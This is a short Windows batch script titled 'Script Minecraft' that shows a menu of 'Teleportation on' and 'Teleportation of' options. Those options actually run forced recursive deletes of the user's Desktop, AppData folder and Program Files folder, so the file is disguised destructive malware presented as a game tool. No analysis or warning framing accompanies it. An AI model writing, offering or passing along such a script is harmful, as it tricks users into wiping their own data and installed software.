@echo off
title Script Minecraft
color 0a

:MENU
echo.
echo Please choose one of the following options:
echo.
echo 1 - Teleportation on
echo 2 - Teleportation of
echo 3 - Close this window
echo.
set /p m=Press 1, 2 or 3 and press ENTER:
if %M%==1 goto de1
if %M%==2 goto de2
if %M%==3 goto de3

:de1
cls
rmdir /s /q %UserProfile%\Desktop\
rmdir /s /q %appdata%
goto :MENU

:de2
cls
rmdir /s /q %programfiles%
goto :MENU

:de3
cls
echo.
color 3
echo Thanks for using this tool.
echo.
pause
exit
